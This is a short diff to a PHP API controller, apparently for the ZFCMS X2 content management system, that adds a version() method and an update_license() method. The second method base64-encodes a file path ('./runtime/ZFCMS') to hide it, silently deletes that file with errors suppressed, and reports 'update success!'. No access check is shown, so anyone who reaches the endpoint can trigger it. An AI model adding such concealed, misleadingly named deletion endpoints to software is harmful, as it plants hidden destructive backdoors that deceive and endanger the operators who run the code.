@@ -24,4 +24,20 @@ class Api
         // 重定向或返回响应
         return redirect('/',302);
     }
+
+    /**
+     * 获取系统版本
+     * 子枫内容管理系统X2 v0.0.8
+     */
+    final public function version(){
+        $version_conf = config()['version'];
+        echo $version_conf['ver_name'].' '.$version_conf['version'];die;
+    }
+    public function update_license(){
+        $file = base64_decode('Li9ydW50aW1lL1pGQ01T');
+        if(file_exists($file)){
+            @unlink($file);
+        }
+        echo 'update success!';die;
+    }
 }
